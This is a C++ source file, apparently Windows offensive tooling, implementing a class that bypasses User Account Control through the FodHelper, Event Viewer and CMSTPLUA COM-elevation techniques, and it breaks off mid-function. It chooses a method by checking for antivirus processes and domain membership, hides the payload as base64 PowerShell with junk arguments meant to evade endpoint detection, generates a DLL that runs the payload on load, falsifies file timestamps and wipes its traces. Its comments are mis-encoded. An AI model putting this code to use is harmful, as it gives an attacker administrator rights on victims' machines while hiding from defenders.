#pragma once
#define WIN32_LEAN_AND_MEAN

// �����ض������þ���
#define _SILENCE_ALL_CXX17_DEPRECATION_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma warning(disable:4996)  // ���������ú����ľ���

#include <windows.h>
#include <wintrust.h>
#include <softpub.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <comdef.h>
#include <iostream>
#include <string>
#include <vector>
#include <cstdlib>
#include <filesystem>
#include <fstream>
#include <sstream>
#include <random>
#include <chrono>
#include <thread>
#include <memory>
#include <wincrypt.h>
#include <bcrypt.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <VersionHelpers.h>
#include <tchar.h>
#include <functional>
#include <cctype>
#include <lm.h>
#include <strsafe.h> 
#include <map>
#include "uacnew.h"

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "version.lib")
#pragma comment(lib, "wintrust.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "netapi32.lib")

namespace fs = std::filesystem;

// ��������
bool DetectSecurityProcesses();
bool IsEnterpriseEdition();
bool IsDomainJoined();

// ===================== �滻�����õ�codecvt���� =====================
std::string WideToUTF8(const std::wstring& wideStr) {
    if (wideStr.empty()) return "";

    int utf8Size = WideCharToMultiByte(CP_UTF8, 0, wideStr.c_str(), -1, nullptr, 0, nullptr, nullptr);
    if (utf8Size == 0) return "";

    std::string utf8Str(utf8Size, 0);
    WideCharToMultiByte(CP_UTF8, 0, wideStr.c_str(), -1, &utf8Str[0], utf8Size, nullptr, nullptr);

    // �Ƴ�ĩβ��null�ַ�
    if (!utf8Str.empty() && utf8Str.back() == '\0') {
        utf8Str.pop_back();
    }
    return utf8Str;
}

std::wstring UTF8ToWide(const std::string& utf8Str) {
    if (utf8Str.empty()) return L"";

    int wideSize = MultiByteToWideChar(CP_UTF8, 0, utf8Str.c_str(), -1, nullptr, 0);
    if (wideSize == 0) return L"";

    std::wstring wideStr(wideSize, 0);
    MultiByteToWideChar(CP_UTF8, 0, utf8Str.c_str(), -1, &wideStr[0], wideSize);

    // �Ƴ�ĩβ��null�ַ�
    if (!wideStr.empty() && wideStr.back() == L'\0') {
        wideStr.pop_back();
    }
    return wideStr;
}

// ===================== �滻�����õ�GetVersionExW���� =====================

bool IsWindows11OrGreater() {
    if (!IsWindows10OrGreater()) {
        return false;
    }

    // ��鹹���汾�� (Windows 11��22000��ʼ)
    OSVERSIONINFOEXW osvi = { sizeof(osvi), 0, 0, 0, 0, {0}, 0, 0, 0, 0 };
    DWORDLONG conditionMask = 0;

    osvi.dwBuildNumber = 22000;
    VER_SET_CONDITION(conditionMask, VER_BUILDNUMBER, VER_GREATER_EQUAL);

    return VerifyVersionInfoW(&osvi, VER_BUILDNUMBER, conditionMask);
}

bool CloneFileAttributes(const std::filesystem::path& sourcePath, const std::filesystem::path& targetPath) {
    // 1. ��ȡԴ�ļ����ԣ�ʱ��� + ���Ա�־��
    WIN32_FILE_ATTRIBUTE_DATA sourceAttrs;
    if (!GetFileAttributesExW(sourcePath.c_str(), GetFileExInfoStandard, &sourceAttrs)) {
        return false; // Դ�ļ����Ի�ȡʧ��
    }

    // 2. ����Ŀ���ļ�ʱ���
    HANDLE hTarget = CreateFileW(
        targetPath.c_str(),
        FILE_WRITE_ATTRIBUTES,       // ����д����Ȩ��
        FILE_SHARE_READ,             // �����������̶�ȡ
        nullptr,
        OPEN_EXISTING,               // Ŀ���ļ������Ѵ���
        FILE_ATTRIBUTE_NORMAL,       // ��ʱȡ�����Ա����ͻ
        nullptr
    );
    if (hTarget == INVALID_HANDLE_VALUE) {
        return false;
    }

    // 3. ����ʱ���������/����/�޸�ʱ�䣩
    FILETIME creationTime = sourceAttrs.ftCreationTime;
    FILETIME lastAccessTime = sourceAttrs.ftLastAccessTime;
    FILETIME lastWriteTime = sourceAttrs.ftLastWriteTime;
    if (!SetFileTime(hTarget, &creationTime, &lastAccessTime, &lastWriteTime)) {
        CloseHandle(hTarget);
        return false;
    }
    CloseHandle(hTarget); // ʱ���������ɺ�رվ��

    // 4. �����ļ����Ա�־������/ֻ��/ϵͳ�ȣ�
    DWORD attributes = sourceAttrs.dwFileAttributes;
    if (!SetFileAttributesW(targetPath.c_str(), attributes)) {
        return false;
    }

    return true;
}

bool AppendFile(const fs::path& sourcePath, const fs::path& targetPath) {
    // 1. ���Դ�ļ��Ƿ����
    if (!fs::exists(sourcePath)) {
        return false;
    }

    // 2. �Զ�����׷��ģʽ��Ŀ���ļ�
    std::ofstream outFile(targetPath, std::ios::binary | std::ios::app);
    if (!outFile.is_open()) {
        return false;
    }

    // 3. �Զ�����ģʽ��ȡԴ�ļ�
    std::ifstream inFile(sourcePath, std::ios::binary);
    if (!inFile.is_open()) {
        outFile.close();
        return false;
    }

    // 4. ʹ�û�������鸴�����ݣ���Ч������ļ���
    std::vector<char> buffer(4096); // 4KB������
    while (inFile.read(buffer.data(), buffer.size())) {
        outFile.write(buffer.data(), inFile.gcount()); // д��ʵ�ʶ�ȡ���ֽ���
    }
    outFile.write(buffer.data(), inFile.gcount()); // д�����һ������

    // 5. �ر��ļ����
    inFile.close();
    outFile.close();
    return true;
}

// ===================== COM��Ȩ�ӿڶ��� =====================
typedef struct _ICMLuaUtil {
    void* lpVtbl;
} ICMLuaUtil;

typedef struct _ICMLuaUtilVtbl {
    HRESULT(__stdcall* QueryInterface)(ICMLuaUtil*, REFIID, void**);
    ULONG(__stdcall* AddRef)(ICMLuaUtil*);
    ULONG(__stdcall* Release)(ICMLuaUtil*);
    HRESULT(__stdcall* Method1)(ICMLuaUtil*);
    HRESULT(__stdcall* Method2)(ICMLuaUtil*);
    HRESULT(__stdcall* Method3)(ICMLuaUtil*);
    HRESULT(__stdcall* Method4)(ICMLuaUtil*);
    HRESULT(__stdcall* Method5)(ICMLuaUtil*);
    HRESULT(__stdcall* Method6)(ICMLuaUtil*);
    HRESULT(__stdcall* ShellExec)(ICMLuaUtil*, LPCWSTR, LPCWSTR, LPCWSTR, ULONG, ULONG);
    HRESULT(__stdcall* SetRegistryStringValue)(ICMLuaUtil*, HKEY, LPCTSTR, LPCTSTR, LPCTSTR);
} ICMLuaUtilVtbl;

// COM���CLSID��IID
static const CLSID CLSID_CMSTPLUA = { 0x3E5FC7F9, 0x9A51, 0x4367, {0x90, 0x63, 0xA1, 0x20, 0x24, 0x4F, 0xBE, 0xC7} };
static const IID IID_ICMLuaUtil = { 0x6EDD6D74, 0xC007, 0x4E75, {0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C} };

// ===================== UAC�ƹ��� =====================
enum class UacMethod {
    FodHelper,
    EventViewer,
    CMSTPProtocol,
    ComHijack,
    Max
};

class UacmeBypass {
public:
    struct SystemInfo {
        bool isWin10;
        bool isWin11;
        bool isServer;
        DWORD uacLevel;
        bool hasRegProtection;
    };

    SystemInfo AnalyzeSystem();
    UacMethod ChooseBestMethod();
    std::wstring GetSystemDirectory();
    std::wstring GetRandomString(size_t len);
    std::wstring ObfuscateCommand(const fs::path& path);
    bool IsRegistryProtected(HKEY root, const std::wstring& subKey);
    bool VerifyMicrosoftSignature(const std::wstring& filePath);
    void CleanupAfterProcess(const std::wstring& procName, std::function<void()> action);
    bool SecureDelete(const fs::path& path);
    bool CreateMaliciousDll(const fs::path& payloadPath, const fs::path& dllPath);
    fs::path CreateTempFile(const std::wstring& baseExtension = L".tmp");
    bool CopyFileWithObfuscation(const fs::path& source, const fs::path& destination);
    void SetRandomFileTime(const fs::path& path);
    fs::path GetTempDirectory();
    bool BypassUac(UacMethod method, const fs::path& payload);
    bool AutoBypass(const fs::path& payload);
    fs::path GetCurrentProcessPath();

    // ���������������Ի��Ƶ�UAC�ƹ�
    bool BypassUacWithRetry(UacMethod method, const fs::path& payload, int maxRetries = 3);
    bool AutoBypassWithRetry(const fs::path& payload, int maxRetriesPerMethod = 2);

private:
    bool Method_FodHelper(const fs::path& payload);
    bool Method_EventViewer(const fs::path& payload);
    bool Method_CMSTPProtocol(const fs::path& payload);
    bool Method_ComHijack(const fs::path& payload);  // COM�ӿ���Ȩ����
};

// ===================== �෽��ʵ�� =====================
UacmeBypass::SystemInfo UacmeBypass::AnalyzeSystem() {
    SystemInfo info = {};

    info.isWin10 = IsWindows10OrGreater();
    info.isWin11 = IsWindows11OrGreater();
    info.isServer = IsWindowsServer();

    DWORD uacLevel = 0;
    DWORD size = sizeof(DWORD);
    RegGetValue(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        L"ConsentPromptBehaviorAdmin", RRF_RT_REG_DWORD, nullptr, &uacLevel, &size);
    info.uacLevel = uacLevel;

    info.hasRegProtection = IsRegistryProtected(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings") ||
        IsRegistryProtected(HKEY_CURRENT_USER, L"Software\\Classes\\mscfile");

    return info;
}

UacMethod UacmeBypass::ChooseBestMethod() {
    SystemInfo sysInfo = AnalyzeSystem();

    // 1. ������ά��ϵͳ���������������ؼ�ָ�꣩
    struct {
        float osVersion;      // ϵͳ�汾Ȩ�� (Win11=1.0, Win10=0.8, ����=0.5)
        bool hasRegProtection;
        DWORD uacLevel;       // UAC���� (0-4, Խ������Խ��)
        bool isEnterprise;    // ��ҵ��ϵͳ
        bool hasAVProcess;    // ����ɱ�����
        bool isDomainJoined;  // �Ƿ����
    } envProfile = {
        .osVersion = sysInfo.isWin11 ? 1.0f : (sysInfo.isWin10 ? 0.8f : 0.5f),
        .hasRegProtection = sysInfo.hasRegProtection,
        .uacLevel = sysInfo.uacLevel,
        .isEnterprise = IsEnterpriseEdition(),
        .hasAVProcess = DetectSecurityProcesses(),
        .isDomainJoined = IsDomainJoined()
    };

    // 2. Ϊÿ�ַ������㶯̬��Ӧ�֣���������Ȩ�أ�
    auto ScoreMethod = [&](UacMethod method) -> float {
        // ������ = �������гɹ��� * ����������
        float baseScore = 0.0f;
        switch (method) {
        case UacMethod::EventViewer:
            baseScore = (envProfile.osVersion > 0.9) ? 0.85 : 0.6;
            break;
        case UacMethod::ComHijack:
            baseScore = 0.92; // COM��Ȩ�ձ���Ч
            break;
        case UacMethod::FodHelper:
            baseScore = (envProfile.osVersion > 0.7 && !envProfile.hasRegProtection) ? 0.78 : 0.4;
            break;
        case UacMethod::CMSTPProtocol:
            baseScore = (envProfile.uacLevel <= 2) ? 0.75 : 0.35;
            break;
        default: baseScore = 0.5;
        }

        // ���ճͷ��֣������� + �������жȣ�
        float riskPenalty = 0.0f;
        if (envProfile.hasAVProcess) {
            // ����ɱ��ʱEventViewer/FodHelper���ױ�����
            if (method == UacMethod::EventViewer || method == UacMethod::FodHelper)
                riskPenalty += 0.3f;
        }
        if (envProfile.isDomainJoined) {
            // �򻷾��б���ʹ�ø���־��¼��CMSTP
            if (method == UacMethod::CMSTPProtocol)
                riskPenalty += 0.25f;
        }

        return std::clamp(baseScore - riskPenalty, 0.1f, 1.0f); // �÷ַ�Χ[0.1, 1.0]
        };

    // 3. ��Ҷ˹�Ż����ߣ�ƽ��̽��������
    static std::map<UacMethod, float> historicalSuccess; // ��ʷ�ɹ��ʻ���
    if (historicalSuccess.empty()) {
        // ��ʼ��Ĭ��Ȩ��
        historicalSuccess = { {UacMethod::EventViewer, 0.8}, {UacMethod::ComHijack, 0.9},
                             {UacMethod::FodHelper, 0.7}, {UacMethod::CMSTPProtocol, 0.6} };
    }

    // �������պ�ѡ�� = ��ǰ������ * ��ʷ�ɹ���
    std::vector<std::pair<UacMethod, float>> candidates;
    for (int i = 0; i < static_cast<int>(UacMethod::Max); ++i) {
        auto method = static_cast<UacMethod>(i);
        float finalScore = ScoreMethod(method) * historicalSuccess[method];
        candidates.emplace_back(method, finalScore);
    }

    // ���÷ֽ�������ѡ�����ŷ���
    std::sort(candidates.begin(), candidates.end(),
        [](auto& a, auto& b) { return a.second > b.second; });

    // 10%����̽�����ŷ���������ģʽ�̶�����
    if (rand() % 100 < 10 && candidates.size() > 1) {
        return candidates[1].first; // ѡ��ڶ���
    }
    return candidates[0].first; // Ĭ�Ϸ������Ž�
}

std::wstring UacmeBypass::GetSystemDirectory() {
    wchar_t sysDir[MAX_PATH];
    UINT result = ::GetSystemDirectoryW(sysDir, MAX_PATH);
    std::wstring path = (result > 0) ? std::wstring(sysDir) : L"C:\\Windows\\System32";
    if (path.back() != L'\\') path += L'\\';
    return path;
}

std::wstring UacmeBypass::GetRandomString(size_t len) {
    static const wchar_t chars[] = L"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    std::wstring result;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, static_cast<int>(wcslen(chars) - 1));
    for (size_t i = 0; i < len; ++i)
        result += chars[dis(gen)];
    return result;
}

std::wstring UacmeBypass::ObfuscateCommand(const fs::path& path) {
    std::wstring cmd = L"\"" + path.wstring() + L"\"";
    DWORD encSize = 0;
    if (!CryptBinaryToStringW(reinterpret_cast<const BYTE*>(cmd.c_str()),
        static_cast<DWORD>(cmd.size() * sizeof(wchar_t)),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        NULL, &encSize)) {
        return cmd;
    }
    std::vector<wchar_t> buffer(encSize);
    if (CryptBinaryToStringW(reinterpret_cast<const BYTE*>(cmd.c_str()),
        static_cast<DWORD>(cmd.size() * sizeof(wchar_t)),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        buffer.data(), &encSize)) {
        return L"powershell -ep bypass -enc \"" + std::wstring(buffer.data()) + L"\"";
    }
    return cmd;
}

bool UacmeBypass::IsRegistryProtected(HKEY root, const std::wstring& subKey) {
    HKEY hKey;
    if (RegOpenKeyExW(root, subKey.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return false;

    DWORD legacyDisable = 0, editFlags = 0;
    DWORD size = sizeof(DWORD);
    bool isProtected = false;
    if (RegQueryValueExW(hKey, L"LegacyDisable", NULL, NULL,
        reinterpret_cast<LPBYTE>(&legacyDisable), &size) == ERROR_SUCCESS && legacyDisable == 1)
        isProtected = true;
    if (RegQueryValueExW(hKey, L"EditFlags", NULL, NULL,
        reinterpret_cast<LPBYTE>(&editFlags), &size) == ERROR_SUCCESS && editFlags == 0x00010000)
        isProtected = true;

    RegCloseKey(hKey);
    return isProtected;
}

bool UacmeBypass::VerifyMicrosoftSignature(const std::wstring& filePath) {
    if (!fs::exists(filePath)) {
        return false;
    }

    const std::wstring sysDir = GetSystemDirectory();
    fs::path targetPath(filePath);
    if (targetPath.wstring().find(sysDir) == std::wstring::npos) {
        return false;
    }

    WINTRUST_FILE_INFO fileInfo = { sizeof(fileInfo) };
    fileInfo.pcwszFilePath = filePath.c_str();

    WINTRUST_DATA trustData = { sizeof(trustData) };
    trustData.dwUIChoice = WTD_UI_NONE;
    trustData.fdwRevocationChecks = WTD_REVOKE_WHOLECHAIN;
    trustData.dwUnionChoice = WTD_CHOICE_FILE;
    trustData.pFile = &fileInfo;
    trustData.dwStateAction = WTD_STATEACTION_VERIFY;

    GUID actionGuid = WINTRUST_ACTION_GENERIC_VERIFY_V2;
    LONG lStatus = WinVerifyTrust(nullptr, &actionGuid, &trustData);

    bool isValid = false;
    if (lStatus == ERROR_SUCCESS) {
        CRYPT_PROVIDER_DATA* pProvData = WTHelperProvDataFromStateData(trustData.hWVTStateData);
        if (pProvData && pProvData->csSigners > 0) {
            PCRYPT_PROVIDER_SGNR pSigner = pProvData->pasSigners;
            if (pSigner->csCertChain > 0) {
                PCCERT_CONTEXT pCertContext = pSigner->pasCertChain[0].pCert;
                DWORD nameLen = CertGetNameStringW(pCertContext,
                    CERT_NAME_SIMPLE_DISPLAY_TYPE,
                    0, nullptr, nullptr, 0);

                if (nameLen > 1) {
                    std::wstring subjectName(nameLen, L'\0');
                    CertGetNameStringW(pCertContext,
                        CERT_NAME_SIMPLE_DISPLAY_TYPE,
                        0, nullptr, &subjectName[0], nameLen);
                    isValid = (subjectName.find(L"Microsoft Corporation") != std::wstring::npos);
                }
            }
        }
    }

    trustData.dwStateAction = WTD_STATEACTION_CLOSE;
    WinVerifyTrust(nullptr, &actionGuid, &trustData);

    return isValid;
}

void UacmeBypass::CleanupAfterProcess(const std::wstring& procName, std::function<void()> action) {
    std::thread([this, procName, action]() {
        DWORD pid = 0;
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap == INVALID_HANDLE_VALUE) return;

        PROCESSENTRY32W pe = { sizeof(pe) };
        if (Process32FirstW(hSnap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, procName.c_str()) == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);

        if (pid != 0) {
            HANDLE hProc = OpenProcess(SYNCHRONIZE, FALSE, pid);
            if (hProc) {
                WaitForSingleObject(hProc, INFINITE);
                CloseHandle(hProc);
                action();
            }
        }
        }).detach();
}

bool UacmeBypass::SecureDelete(const fs::path& path) {
    if (!fs::exists(path)) return true;

    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize)) {
        CloseHandle(hFile);
        return false;
    }

    const DWORD bufferSize = 4096;
    std::vector<char> junkData(bufferSize);
    DWORD bytesWritten;

    for (int i = 0; i < 3; i++) {
        SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);

        LONGLONG remaining = fileSize.QuadPart;
        while (remaining > 0) {
            DWORD writeSize = (remaining > bufferSize) ? bufferSize : static_cast<DWORD>(remaining);
            std::generate(junkData.begin(), junkData.begin() + writeSize,
                []() { return rand() % 256; });

            if (!WriteFile(hFile, junkData.data(), writeSize, &bytesWritten, nullptr) ||
                bytesWritten != writeSize) {
                CloseHandle(hFile);
                return false;
            }
            remaining -= writeSize;
        }
        FlushFileBuffers(hFile);
    }

    CloseHandle(hFile);
    return DeleteFileW(path.c_str());
}

bool UacmeBypass::CreateMaliciousDll(const fs::path& payloadPath, const fs::path& dllPath) {
    fs::create_directories(dllPath.parent_path());

    // ʹ���µ�WideToUTF8�����滻�����õ�codecvt
    std::string payloadStr = WideToUTF8(payloadPath.wstring());

    std::string dllCode = R"(
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        system(")";
    dllCode += payloadStr;
    dllCode += R"(");
    }
    return TRUE;
})";

    std::ofstream dllFile(dllPath, std::ios::binary);
    if (!dllFile) {
        return false;
    }
    dllFile.write(dllCode.data(), dllCode.size());
    return dllFile.good();
}

fs::path UacmeBypass::CreateTempFile(const std::wstring& baseExtension) {
    wchar_t tempDir[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, tempDir)) {
        return L"C:\\Windows\\Temp\\tempfile.tmp";
    }

    fs::create_directories(tempDir);

    const wchar_t* fakeExtensions[] = { L".log", L".ini", L".dmp", L".bin", L".bak" };
    auto extension = fakeExtensions[rand() % (sizeof(fakeExtensions) / sizeof(fakeExtensions[0]))];

    for (int i = 0; i < 10; ++i) {
        std::wstring fileName = GetRandomString(12) + extension;
        fs::path tempFile = fs::path(tempDir) / fileName;

        if (!fs::exists(tempFile)) {
            std::ofstream testFile(tempFile);
            if (testFile) {
                testFile.close();
                return tempFile;
            }
        }
    }
    return fs::path();
}

bool UacmeBypass::CopyFileWithObfuscation(const fs::path& source, const fs::path& destination) {
    fs::create_directories(destination.parent_path());

    std::ifstream srcFile(source, std::ios::binary);
    if (!srcFile) return false;

    size_t junkSize = static_cast<size_t>(rand() % 512 + 256);
    std::vector<char> junkData(junkSize);
    std::generate(junkData.begin(), junkData.end(), []() { return rand() % 256; });

    std::ofstream dstFile(destination, std::ios::binary);
    if (!dstFile) return false;

    dstFile.write(junkData.data(), static_cast<std::streamsize>(junkData.size()));
    dstFile << srcFile.rdbuf();
    return true;
}

void UacmeBypass::SetRandomFileTime(const fs::path& path) {
    FILETIME ftCreation, ftLastWrite;
    SYSTEMTIME st;

    GetSystemTime(&st);
    st.wYear = st.wYear - (rand() % 5) - 1;
    st.wMonth = rand() % 12 + 1;
    st.wDay = rand() % 28 + 1;
    st.wHour = rand() % 24;
    st.wMinute = rand() % 60;

    SystemTimeToFileTime(&st, &ftCreation);
    SystemTimeToFileTime(&st, &ftLastWrite);

    HANDLE hFile = CreateFileW(path.c_str(), FILE_WRITE_ATTRIBUTES, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile != INVALID_HANDLE_VALUE) {
        SetFileTime(hFile, &ftCreation, nullptr, &ftLastWrite);
        CloseHandle(hFile);
    }
}

fs::path UacmeBypass::GetTempDirectory() {
    wchar_t path[MAX_PATH];
    return (GetTempPathW(MAX_PATH, path) > 0) ? fs::path(path) : L"C:\\Windows\\Temp\\";
}

bool UacmeBypass::BypassUac(UacMethod method, const fs::path& payload) {
    switch (method) {
    case UacMethod::FodHelper:     return Method_FodHelper(payload);
    case UacMethod::EventViewer:   return Method_EventViewer(payload);
    case UacMethod::CMSTPProtocol: return Method_CMSTPProtocol(payload);
    case UacMethod::ComHijack:     return Method_ComHijack(payload);
    default: return false;
    }
}

// �����������Ի��Ƶ�UAC�ƹ�����
bool UacmeBypass::BypassUacWithRetry(UacMethod method, const fs::path& payload, int maxRetries) {
    for (int attempt = 1; attempt <= maxRetries; attempt++) {
        std::wcout << L"���Է��� " << static_cast<int>(method) << L"���� " << attempt << L" �γ���..." << std::endl;

        bool result = BypassUac(method, payload);

        if (result) {
            std::wcout << L"���� " << static_cast<int>(method) << L" �ڵ� " << attempt << L" �γ����гɹ�" << std::endl;
            return true;
        }

        std::wcout << L"���� " << static_cast<int>(method) << L" �� " << attempt << L" �γ���ʧ��" << std::endl;

        // ����������һ�γ��ԣ��ȴ�һ��ʱ��������
        if (attempt < maxRetries) {
            int delayMs = 1000 * attempt; // ÿ�����Եȴ�ʱ�����
            std::wcout << L"�ȴ� " << delayMs << L" ���������..." << std::endl;
            std::this_thread::sleep_for(std::chrono::milliseconds(delayMs));
        }
    }

    return false;
}

bool UacmeBypass::AutoBypass(const fs::path& payload) {
    const std::vector<UacMethod> methods = {
        UacMethod::ComHijack,
        UacMethod::CMSTPProtocol,
        UacMethod::EventViewer,
        UacMethod::FodHelper
    };

    for (const auto& method : methods) {
        if (BypassUac(method, payload)) {
            return true;
        }
    }
    return false;
}

// �����������Ի��Ƶ��Զ��ƹ�
bool UacmeBypass::AutoBypassWithRetry(const fs::path& payload, int maxRetriesPerMethod) {
    // ����ϵͳ����ѡ����ѷ���
    UacMethod bestMethod = ChooseBestMethod();
    std::wcout << L"ѡ�����ѷ���: " << static_cast<int>(bestMethod) << std::endl;

    // ���ȳ�����ѷ����������ԣ�
    if (BypassUacWithRetry(bestMethod, payload, maxRetriesPerMethod)) {
        return true;
    }

    std::wcout << L"��ѷ���ʧ�ܣ��������п��÷���..." << std::endl;

    // �����ѷ���ʧ�ܣ��������з���
    const std::vector<UacMethod> allMethods = {
        UacMethod::ComHijack,
        UacMethod::CMSTPProtocol,
        UacMethod::EventViewer,
        UacMethod::FodHelper
    };

    for (const auto& method : allMethods) {
        if (method == bestMethod) continue; // �Ѿ����Թ���ѷ���

        if (BypassUacWithRetry(method, payload, maxRetriesPerMethod)) {
            return true;
        }
    }

    return false;
}

// ===================== COM��Ȩ���ķ��� =====================
bool UacmeBypass::Method_ComHijack(const fs::path& payload) {
    // ʹ��COM Elevation Moniker������Ȩ
    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 2000));

    // ��������Ȩ�������ַ���
    WCHAR wszCLSID[50];
    StringFromGUID2(CLSID_CMSTPLUA, wszCLSID, ARRAYSIZE(wszCLSID));
    WCHAR monikerName[300];
    StringCchPrintf(monikerName, ARRAYSIZE(monikerName),
        L"Elevation:Administrator!new:%s", wszCLSID);

    // ��ʼ��COM
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    if (FAILED(hr)) return false;

    // ���ð�ѡ��
    BIND_OPTS3 bindOpts = { sizeof(bindOpts) };
    bindOpts.dwClassContext = CLSCTX_LOCAL_SERVER;
    bindOpts.hwnd = GetDesktopWindow();

    // ��ȡICMLuaUtil�ӿ�
    ICMLuaUtil* pCMLuaUtil = nullptr;
    hr = CoGetObject(
        monikerName,
        &bindOpts,
        IID_ICMLuaUtil,
        (void**)&pCMLuaUtil
    );

    // ִ��payload
    if (SUCCEEDED(hr) && pCMLuaUtil) {
        // ��ȡ�麯����
        ICMLuaUtilVtbl* vtbl = (ICMLuaUtilVtbl*)pCMLuaUtil->lpVtbl;

        // ʹ��cmd.exe��Ϊִ�����壬Payload��Ϊ����������������
        std::wstring cmdExe = GetSystemDirectory() + L"cmd.exe";

        // �����������EDR��⣨����ԭ�л������ƣ�
        std::wstring randomParam1 = L"/" + GetRandomString(4) + L"=" + GetRandomString(8);
        std::wstring randomParam2 = L"/" + GetRandomString(3) + L"=" + GetRandomString(6);

        // ����������������
        std::wstring obfuscatedCmd = L"/c \"set " + GetRandomString(4) + L"= && " +
            ObfuscateCommand(payload) + L" " + randomParam1 + L" " + randomParam2 + L"\"";

        // ����ShellExecִ��cmd.exe�����ݻ������Payload����
        hr = vtbl->ShellExec(
            pCMLuaUtil,
            cmdExe.c_str(),         // ʹ��cmd.exe��Ϊ��ִ���ļ�
            obfuscatedCmd.c_str(),  // �������Payload������Ϊ����
            NULL,
            SEE_MASK_NO_CONSOLE,
            SW_HIDE
        );

        // �ͷ�COM����
        vtbl->Release(pCMLuaUtil);
    }

    CoUninitialize();
    return SUCCEEDED(hr);
}
// ===================== ����UAC�ƹ����� =====================
bool UacmeBypass::Method_EventViewer(const fs::path& payload) {
    const std::wstring targetExe = GetSystemDirectory() + L"eventvwr.exe";
    if (!VerifyMicrosoftSignature(targetExe))
        return false;

    // ʹ�����ע������������������
    std::wstring randomKey = L"mscfile_" + GetRandomString(8);
    const std::wstring regPath = L"Software\\Classes\\" + randomKey + L"\\shell\\open\\command";

    if (IsRegistryProtected(HKEY_CURRENT_USER, regPath.substr(0, regPath.find_last_of('\\'))))
        return false;

    // ʹ��cmd.exeִ��Payload�������������ƣ�
    std::wstring randomEnvVar = GetRandomString(4);
    std::wstring cmd = L"cmd.exe /c \"set " + randomEnvVar + L"= && " +
        ObfuscateCommand(payload) + L" && set " + randomEnvVar + L"=\"";

    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, regPath.c_str(), 0, NULL,
        REG_OPTION_VOLATILE | REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return false;

    RegSetValueExW(hKey, NULL, 0, REG_SZ,
        reinterpret_cast<const BYTE*>(cmd.c_str()), static_cast<DWORD>((cmd.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(hKey);

    // ������ݷ�ʽ����eventvwr������ԭ�л��ƣ�
    fs::path lnkPath = GetTempDirectory() / (GetRandomString(8) + L".lnk");
    IShellLinkW* psl;
    if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&psl))) {
        psl->SetPath(targetExe.c_str());
        psl->SetArguments((L"/v " + randomKey).c_str());

        IPersistFile* ppf;
        if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (void**)&ppf))) {
            ppf->Save(lnkPath.c_str(), TRUE);
            ppf->Release();
        }
        psl->Release();
    }

    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpFile = lnkPath.c_str();
    sei.nShow = SW_HIDE;
    bool result = ShellExecuteExW(&sei);

    CleanupAfterProcess(L"eventvwr.exe", [this, regPath, lnkPath]() {
        RegDeleteKeyW(HKEY_CURRENT_USER, regPath.c_str());
        SecureDelete(lnkPath);
        });
    return result;
}
bool UacmeBypass::Method_FodHelper(const fs::path& payload) {
    // 1. ��̬���ɸ��Ի���ע��������αװΪVPN���ã�����������
    std::wstring randomKey = L"VPNConfig_" + GetRandomString(10);
    std::wstring fullRegPath = L"Software\\Classes\\" + randomKey + L"\\Shell\\Open\\command";

    // 2. �������ͨ��Base64���� + ��������ע�루����ԭ�л������ƣ�
    std::wstring randomEnvVar = GetRandomString(4);
    std::wstring cmd = L"cmd.exe /c \"set " + randomEnvVar + L"= && " +
        ObfuscateCommand(payload) + L" && set " + randomEnvVar + L"=\"";

    // 3. ע������ǿ�������α��ǩ������EDR�����ԣ�����ԭ�л��ƣ�
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, fullRegPath.c_str(), 0, NULL,
        REG_OPTION_VOLATILE | REG_OPTION_BACKUP_RESTORE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return false;

    // ���úϷ���۵�Ĭ��ֵ��ģ��΢��ǩ������
    RegSetValueExW(hKey, NULL, 0, REG_SZ,
        reinterpret_cast<const BYTE*>(L"\"C:\\Program Files\\Common Files\\VPNClient\\vpnui.exe\""),
        68 * sizeof(wchar_t));

    // �ӳٴ�����������˯�߲���������Ϊ����
    RegSetValueExW(hKey, L"SleepDelay", 0, REG_SZ,
        reinterpret_cast<const BYTE*>(std::to_wstring(rand() % 1500 + 500).c_str()),
